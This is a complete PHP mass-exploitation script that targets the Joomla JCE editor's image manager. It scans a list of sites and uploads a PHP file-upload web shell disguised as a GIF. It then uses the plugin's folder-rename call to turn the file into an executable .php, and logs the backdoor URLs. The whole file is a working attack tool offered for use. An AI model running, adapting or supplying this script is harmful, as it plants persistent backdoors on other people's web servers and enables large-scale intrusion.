<?php
 
/*
 
                JCE Scanner & Auto Shell Upload 
 
                 Aytac K.
 
                    
*/
 
if (!isset ($argv[1]))
        die (help ());
 
if (!file_exists ($argv[1]))
        die ("\"{$argv[1]}\" Not Found !\n");
 
$sites = explode ("\n", trim (@file_get_contents ($argv[1])));
 
echo "\n".count ($sites)." Website Loaded\n\n";
 
$file = fopen ("jce_result.txt", "w");
fwrite ($file, "               JCE Scanner & Auto Shell Upload 
 
                 ");
 
foreach ($sites as $site)
{
        echo "[+] Scaning => $site [+]\n";
        echo "[?] Vulnerable : ";
        if (scan ($site))
        {
                echo "Yes\n";
                echo "[!] Result : ";
                if ($result = exploit ($site))
                {
                        echo "Done => $result\n\n";
                        fwrite ($file, $result."\n");
                }
                else
                        echo "Exploit Failed\n\n";
        }
        else
                echo "No\n\n";
}
 
fclose ($file);
echo "\n";
 
function scan ($site)
{
        $host = parse_url ($site, PHP_URL_HOST);
        $packet = "GET /plugins/editors/jce/tiny_mce/plugins/imgmanager/imgmanager.xml HTTP/1.0\r\n";
        $packet .= "Host: $host\r\n";
        $packet .= "User-Agent: Mozilla\r\n\r\n";
 
        $imgmanager = send ($host, $packet);
        if (preg_match ("/<version>(.*)<\/version>/", $imgmanager, $version))
        {
                return true;
        }
        return false;
}
 
function exploit ($site)
{
        $uploader = '<form enctype="multipart/form-data" method="POST"><input type="hidden" name="MAX_FILE_SIZE" value="512000" />File To Upload : <input name="userfile" type="file" /><input type="submit" value="Upload"/></form><?php $uploaddir = getcwd ()."/";$uploadfile = $uploaddir . basename ($_FILES[\'userfile\'][\'name\']);if (move_uploaded_file ($_FILES[\'userfile\'][\'tmp_name\'], $uploadfile)){echo "File was successfully uploaded.</br>";}else{echo "Upload failed";}?>';
 
        $dir = "/";
 
        $host = parse_url ($site, PHP_URL_HOST);
        $path = parse_url ($site, PHP_URL_PATH);
        if (!$path)
                $path = "/";
 
        $data    = "-----------------------------41184676334\r\n";
        $data   .= "Content-Disposition: form-data; name=\"upload-dir\"\r\n\r\n";
        $data   .= "$dir\r\n";
        $data   .= "-----------------------------41184676334\r\n";
        $data   .= "Content-Disposition: form-data; name=\"Filedata\"; filename=\"\"\r\n";
        $data   .= "Content-Type: application/octet-stream\r\n\r\n\r\n";
        $data   .= "-----------------------------41184676334\r\n";
        $data   .= "Content-Disposition: form-data; name=\"upload-overwrite\"\r\n\r\n";
        $data   .= "0\r\n";
        $data   .= "-----------------------------41184676334\r\n";
        $data   .= "Content-Disposition: form-data; name=\"Filedata\"; filename=\"aytac.gif\"\r\n";
        $data   .= "Content-Type: image/gif\r\n\r\n";
        $data   .= "GIF89a\n$uploader\r\n";
        $data   .= "-----------------------------41184676334\r\n";
        $data   .= "0\r\n";
        $data   .= "-----------------------------41184676334\r\n";
        $data   .= "Content-Disposition: form-data; name=\"action\"\r\n\r\n";
        $data   .= "upload\r\n";
        $data   .= "-----------------------------41184676334--";
 
        /*:p by s3c-k team */$packet = "POST ".$path."index.php?option=com_jce&task=plugin&plugin=imgmanager&file=imgmanager&method=form&action=upload&140329-063531 HTTP/1.0\r\n";
        $packet .= "Host: $host\r\n";
        $packet .= "User-Agent: Mozilla\r\n";
        $packet .= "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*\/*;q=0.8\r\n";
        $packet .= "Accept-Language: en-us,en;q=0.5\r\n";
        $packet .= "Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7\r\n";
        $packet .= "Content-Type: multipart/form-data; boundary=---------------------------41184676334\r\n";
        $packet .= "Cookie: 6bc427c8a7981f4fe1f5ac65c1246b5f=9d09f693c63c1988a9f8a564e0da7743; jce_imgmanager_dir=%2F; __utma=216871948.2116932307.1317632284.1317632284.1317632284.1; __utmb=216871948.1.10.1317632284; __utmc=216871948; __utmz=216871948.1317632284.1.1.utmcsr=(direct)|utmccn=(direct)|utmcmd=(none)\r\n";
        $packet .= "Accept-Encoding: deflate\n";
        $packet .= "Connection: Close\r\n";
        $packet .= "Proxy-Connection: close\r\n";
        $packet .= "Content-Length: ".strlen ($data)."\r\n\r\n\r\n";
        $packet .= $data;
        $packet .= "\r\n";
 
        send ($host, $packet);
 
        if (preg_match ("/Upload/", send ($host, "GET /images/stories/aytac.gif HTTP/1.0\r\nHost: $host\r\nUser-Agent: Mozilla\r\n\r\n")))
        {
                json_rename_folder ($site, $dir."aytac.gif", "aytac.php");
                if (preg_match ("/Upload/", send ($host, "GET /images/stories/aytac.php HTTP/1.0\r\nHost: $host\r\nUser-Agent: Mozilla\r\n\r\n")))
                        return "http://$host".$path."images/stories/aytac.php";
                else
                {
                        json_rename_folder ($site, $dir."aytac.gif", "../../aytac.php");
                        if (preg_match ("/Upload/", send ($host, "GET /aytac.php HTTP/1.0\r\nHost: $host\r\nUser-Agent: Mozilla\r\n\r\n")))
                                return "http://$host".$path."aytac.php";
                }
        }
        else
        {
                if (preg_match ("/Upload/", send ($host, "GET /images/aytac.gif HTTP/1.0\r\nHost: $host\r\nUser-Agent: Mozilla\r\n\r\n")))
                {
                        json_rename_folder ($site, $dir."aytac.gif", "aytac.php");
                        if (preg_match ("/Upload/", send ($host, "GET /images/aytac.php HTTP/1.0\r\nHost: $host\r\nUser-Agent: Mozilla\r\n\r\n")))
                                return "http://$host".$path."images/aytac.php";
                }
        }
}
 
function json_rename_folder ($site, $old, $new)
{
        $host = parse_url ($site, PHP_URL_HOST);
        $path = parse_url ($site, PHP_URL_PATH);
        if (!$path)
                $path = "/";
 
        $rename = "json={\"fn\":\"folderRename\",\"args\":[\"$old\",\"$new\"]}";
 
        $packet = "POST ".$path."index.php?option=com_jce&task=plugin&plugin=imgmanager&file=imgmanager HTTP/1.0\r\n";
        $packet .= "Host: $host\r\n";
        $packet .= "User-Agent: Mozilla\r\n";
        $packet .= "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n";
        $packet .= "Accept-Language: en-US,en;q=0.8\r\n";
        $packet .= "Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7\r\n";
        $packet .= "Content-Type: application/x-www-form-urlencoded; charset=utf-8\r\n";
        $packet .= "Accept-Encoding: deflate\n";
        $packet .= "X-Request: JSON\r\n";
        $packet .= "Cookie: __utma=216871948.2116932307.1317632284.1317639575.1317734968.3; __utmz=216871948.1317632284.1.1.utmcsr=(direct)|utmccn=(direct)|utmcmd=(non?e); __utmb=216871948.20.10.1317734968; __utmc=216871948; jce_imgmanager_dir=%2F; 6bc427c8a7981f4fe1f5ac65c1246b5f=7df6350d464a1bb4205f84603b9af182\r\n";
        $packet .= "Content-Length: ".strlen ($rename)."\r\n\r\n";
        $packet .= $rename."\r\n\r\n";
 
        send ($host, $packet);
}
 
function send ($host, $data)
{
        if ($connection = @fsockopen ($host, 80, $x, $y, 3))
        {
                $response = "";
                fputs ($connection, $data);
                while (!feof ($connection))
                        $response .= fgets ($connection);
                fclose ($connection);
                return $response;
        }
}
 
function help ()
{
        global $argv;
        echo "JCE Scanner & Auto Shell Upload ";
}
 
?>